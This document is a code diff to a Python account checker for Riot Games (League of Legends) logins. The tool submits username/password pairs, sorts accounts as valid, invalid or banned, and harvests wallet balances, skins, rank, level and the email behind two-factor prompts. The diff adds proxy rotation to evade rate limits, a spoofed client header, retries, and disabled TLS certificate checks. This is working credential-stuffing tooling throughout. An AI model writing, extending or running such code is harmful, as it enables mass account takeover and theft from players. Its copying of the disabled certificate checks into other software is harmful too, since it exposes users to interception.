@@ -4,6 +4,8 @@ from __future__ import annotations
 
 import json
 import re
+import ssl
+import warnings
 from urllib.parse import parse_qs, urlparse
 
 import httpx
@@ -11,20 +13,30 @@ import httpx
 from config import AUTH_URL, ENTITLEMENTS_URL, PLATFORM_MAP, USERINFO_URL
 from models import AccountResult
 
+# Suppress SSL warnings
+warnings.filterwarnings("ignore")
 
 _HEADERS = {
     "User-Agent": (
-        "RiotClient/68.0.0.4948053.4789131 rso-auth (Windows;10;;Professional, x64)"
+        "RiotClient/91.0.2.5765.4789 rso-auth (Windows;10;;Professional, x64)"
     ),
     "Accept": "application/json",
     "Content-Type": "application/json",
+    "Cache-Control": "no-cache",
+    "Accept-Encoding": "gzip, deflate, br",
 }
 
 
 def _build_client(proxy: str | None, timeout: int) -> httpx.Client:
+    # Create a permissive SSL context
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    ctx.set_ciphers("DEFAULT@SECLEVEL=1")
+
     return httpx.Client(
-        headers=_HEADERS,
-        timeout=timeout,
+        headers=_HEADERS.copy(),
+        timeout=httpx.Timeout(timeout, connect=timeout),
         follow_redirects=False,
         proxy=proxy,
         verify=False,
@@ -36,74 +48,123 @@ def check_account(
     password: str,
     proxy: str | None = None,
     timeout: int = 15,
+    verbose: bool = False,
 ) -> AccountResult:
     """Authenticate and fetch all account data."""
     result = AccountResult(username=username, password=password)
-    client = _build_client(proxy, timeout)
 
-    try:
-        # Step 1: Initialize auth session (get cookies)
-        init_body = {
-            "client_id": "riot-client",
-            "nonce": "1",
-            "redirect_uri": "http://localhost/redirect",
-            "response_type": "token id_token",
-            "scope": "account openid",
-        }
-        client.post(AUTH_URL, json=init_body)
+    for attempt in range(2):  # Retry once on failure
+        client = _build_client(proxy, timeout)
+        try:
+            # Step 1: Initialize auth session (get cookies)
+            init_body = {
+                "client_id": "riot-client",
+                "nonce": "1",
+                "redirect_uri": "http://localhost/redirect",
+                "response_type": "token id_token",
+                "scope": "account openid",
+            }
+            init_resp = client.post(AUTH_URL, json=init_body)
 
-        # Step 2: Submit credentials
-        auth_body = {
-            "type": "auth",
-            "username": username,
-            "password": password,
-            "remember": True,
-            "language": "en_US",
-        }
-        resp = client.put(AUTH_URL, json=auth_body)
-        data = resp.json()
+            if verbose:
+                result.error_message = f"init:{init_resp.status_code}"
 
-        if data.get("type") == "response":
-            uri = data["response"]["parameters"]["uri"]
-            token = _extract_token(uri)
-            if not token:
+            if init_resp.status_code not in (200, 201):
                 result.status = "ERROR"
-                result.error_message = "Token extraction failed"
+                result.error_message = f"Init failed: HTTP {init_resp.status_code}"
+                if attempt == 0:
+                    client.close()
+                    continue
                 return result
 
-            result.status = "VALID"
-            _fetch_account_data(client, token, result)
+            # Step 2: Submit credentials
+            auth_body = {
+                "type": "auth",
+                "username": username,
+                "password": password,
+                "remember": True,
+                "language": "en_US",
+            }
+            resp = client.put(AUTH_URL, json=auth_body)
 
-        elif data.get("type") == "multifactor":
-            result.status = "VALID"
-            result.error_message = "2FA enabled - limited data"
-            _try_basic_info(client, data, result)
+            if resp.status_code not in (200, 201):
+                result.status = "ERROR"
+                result.error_message = f"Auth failed: HTTP {resp.status_code}"
+                if attempt == 0:
+                    client.close()
+                    continue
+                return result
 
-        elif data.get("type") == "auth" and "error" in data:
-            error = data["error"]
-            if error == "auth_failure":
-                result.status = "INVALID"
-            elif error == "rate_limited":
-                result.status = "RATE_LIMITED"
-                result.error_message = "Rate limited"
+            try:
+                data = resp.json()
+            except Exception:
+                result.status = "ERROR"
+                result.error_message = f"JSON parse error: {resp.text[:80]}"
+                return result
+
+            resp_type = data.get("type", "")
+
+            if resp_type == "response":
+                uri = data.get("response", {}).get("parameters", {}).get("uri", "")
+                token = _extract_token(uri)
+                if not token:
+                    result.status = "ERROR"
+                    result.error_message = "Token extraction failed"
+                    return result
+
+                result.status = "VALID"
+                _fetch_account_data(client, token, result)
+                return result
+
+            elif resp_type == "multifactor":
+                result.status = "VALID"
+                _try_basic_info(client, data, result)
+                return result
+
+            elif resp_type == "auth" and "error" in data:
+                error = data["error"]
+                if error == "auth_failure":
+                    result.status = "INVALID"
+                    return result
+                elif error == "rate_limited":
+                    result.status = "RATE_LIMITED"
+                    result.error_message = "Rate limited - use more proxies"
+                    return result
+                else:
+                    result.status = "ERROR"
+                    result.error_message = f"Auth error: {error}"
+                    return result
             else:
                 result.status = "ERROR"
-                result.error_message = error
-        else:
-            result.status = "ERROR"
-            result.error_message = f"Unexpected response type: {data.get('type')}"
+                result.error_message = f"Unknown type: {resp_type} | {str(data)[:60]}"
+                return result
 
-    except httpx.TimeoutException:
-        result.status = "ERROR"
-        result.error_message = "Timeout"
-    except httpx.ProxyError:
-        result.status = "ERROR"
-        result.error_message = "Proxy error"
-    except Exception as e:
-        result.status = "ERROR"
-        result.error_message = str(e)[:100]
-    finally:
-        client.close()
+        except httpx.TimeoutException:
+            result.status = "ERROR"
+            result.error_message = f"Timeout (proxy: {proxy or 'none'})"
+            if attempt == 0:
+                client.close()
+                continue
+        except httpx.ProxyError as e:
+            result.status = "ERROR"
+            result.error_message = f"Proxy dead: {proxy}"
+            if attempt == 0:
+                client.close()
+                continue
+        except httpx.ConnectError as e:
+            result.status = "ERROR"
+            result.error_message = f"Connection failed: {str(e)[:60]}"
+            if attempt == 0:
+                client.close()
+                continue
+        except Exception as e:
+            result.status = "ERROR"
+            result.error_message = f"{type(e).__name__}: {str(e)[:80]}"
+            if attempt == 0:
+                client.close()
+                continue
+        finally:
+            client.close()
 
     return result
 
@@ -126,25 +187,36 @@ def _fetch_account_data(client: httpx.Client, token: str, result: AccountResult)
     # Get user info (region, summoner name, etc.)
     try:
         resp = client.get(USERINFO_URL, headers=auth_header)
-        info = resp.json()
+        if resp.status_code == 200:
+            info = resp.json()
 
-        result.region = info.get("lol_account", {}).get("summoner_region", "").upper()
-        if not result.region:
-            result.region = info.get("region", {}).get("tag", "UNKNOWN").upper()
+            result.region = (
+                info.get("lol_account", {}).get("summoner_region", "").upper()
+            )
+            if not result.region:
+                result.region = info.get("region", {}).get("tag", "UNKNOWN").upper()
 
-        result.summoner_name = info.get("lol_account", {}).get("summoner_name", "")
-        result.email_verified = info.get("email_verified", False)
+            result.summoner_name = info.get("lol_account", {}).get(
+                "summoner_name", ""
+            )
+            if not result.summoner_name:
+                result.summoner_name = info.get("acct", {}).get("game_name", "")
 
-        acct = info.get("ban", {})
-        if acct:
-            restrictions = acct.get("restrictions", [])
-            for r in restrictions:
-                if r.get("type") == "PERMANENT_BAN":
-                    result.status = "BANNED"
-                    result.ban_status = "PERMANENT"
-                    break
-                elif r.get("type") == "TIME_BAN":
-                    result.ban_status = "TEMPORARY"
+            result.level = info.get("lol_account", {}).get("summoner_level", 0)
+            result.email_verified = info.get("email_verified", False)
+
+            # Check bans
+            ban_info = info.get("ban", {})
+            if ban_info:
+                restrictions = ban_info.get("restrictions", [])
+                for r in restrictions:
+                    rtype = r.get("type", "")
+                    if rtype == "PERMANENT_BAN":
+                        result.status = "BANNED"
+                        result.ban_status = "PERMANENT"
+                        break
+                    elif "BAN" in rtype:
+                        result.ban_status = "TEMPORARY"
     except Exception:
         pass
 
@@ -152,13 +224,14 @@ def _fetch_account_data(client: httpx.Client, token: str, result: AccountResult)
     entitlement_token = None
     try:
         resp = client.post(ENTITLEMENTS_URL, headers=auth_header, json={})
-        entitlement_token = resp.json().get("entitlements_token")
+        if resp.status_code == 200:
+            entitlement_token = resp.json().get("entitlements_token")
     except Exception:
         pass
 
     platform = PLATFORM_MAP.get(result.region, "")
 
-    # Get store/inventory data (RP, BE, skins, champions)
+    # Get store/inventory data
     if platform and entitlement_token:
         store_headers = {
             **auth_header,
@@ -177,10 +250,7 @@ def _fetch_store_data(
     """Fetch store data: RP, BE, skins, champions."""
     region_lower = platform.lower()
 
-    # Ledge (League Edge) endpoints for modern client
-    ledge_base = f"https://{region_lower}.ledge.leagueoflegends.com"
-
-    # Try to get wallet (RP + BE)
+    # Try wallet
     try:
         resp = client.get(
             f"https://{region_lower}.store.leagueoflegends.com/storefront/v3/wallet",
@@ -189,14 +259,15 @@ def _fetch_store_data(
         if resp.status_code == 200:
             wallet = resp.json()
             result.rp = wallet.get("rp", 0)
-            result.blue_essence = wallet.get("ip", 0)  # ip = influence points = BE
+            result.blue_essence = wallet.get("ip", 0)
     except Exception:
         pass
 
-    # Try to get inventory (skins + champions)
+    # Try purchase history for skins/champions
     try:
         resp = client.get(
-            f"https://{region_lower}.store.leagueoflegends.com/storefront/v3/history/purchase",
+            f"https://{region_lower}.store.leagueoflegends.com"
+            "/storefront/v3/history/purchase",
             headers=headers,
         )
         if resp.status_code == 200:
@@ -216,8 +287,8 @@ def _fetch_store_data(
     except Exception:
         pass
 
-    # Alternative: inventory service
-    if result.skin_count == 0:
+    # Fallback: misc view
+    if result.skin_count == 0 and result.rp == 0:
         try:
             resp = client.get(
                 f"https://{region_lower}.store.leagueoflegends.com"
@@ -243,19 +314,7 @@ def _fetch_ranked_data(
     """Fetch ranked information and summoner level."""
     region_lower = platform.lower()
 
-    # Get summoner data (level)
-    try:
-        resp = client.get(
-            f"https://{region_lower}.ledge.leagueoflegends.com"
-            "/ledge/v1/notifications",
-            headers=headers,
-        )
-        if resp.status_code == 200:
-            pass  # Notifications don't have level, but validates connection
-    except Exception:
-        pass
-
-    # Ranked data from ledge
+    # Ranked stats
     try:
         resp = client.get(
             f"https://{region_lower}.ledge.leagueoflegends.com"
@@ -275,25 +334,28 @@ def _fetch_ranked_data(
     except Exception:
         pass
 
-    # Summoner level from auth/userinfo is not always available,
-    # try the summoner endpoint
-    try:
-        resp = client.get(
-            f"https://{region_lower}.ledge.leagueoflegends.com"
-            "/summoner-ledge/v1/current",
-            headers=headers,
-        )
-        if resp.status_code == 200:
-            summoner = resp.json()
-            result.level = summoner.get("summonerLevel", 0)
-            if not result.summoner_name:
-                result.summoner_name = summoner.get("displayName", "")
-    except Exception:
-        pass
+    # Summoner level (if not already fetched from userinfo)
+    if result.level == 0:
+        try:
+            resp = client.get(
+                f"https://{region_lower}.ledge.leagueoflegends.com"
+                "/summoner-ledge/v1/current",
+                headers=headers,
+            )
+            if resp.status_code == 200:
+                summoner = resp.json()
+                result.level = summoner.get("summonerLevel", 0)
+                if not result.summoner_name:
+                    result.summoner_name = summoner.get("displayName", "")
+        except Exception:
+            pass
 
 
 def _try_basic_info(client: httpx.Client, data: dict, result: AccountResult):
     """Extract whatever info we can from a 2FA-gated response."""
     email = data.get("multifactor", {}).get("email", "")
+    method = data.get("multifactor", {}).get("method", "")
     if email:
-        result.error_message = f"2FA → {email}"
+        result.error_message = f"2FA ({method}) -> {email}"
+    else:
+        result.error_message = f"2FA ({method})"
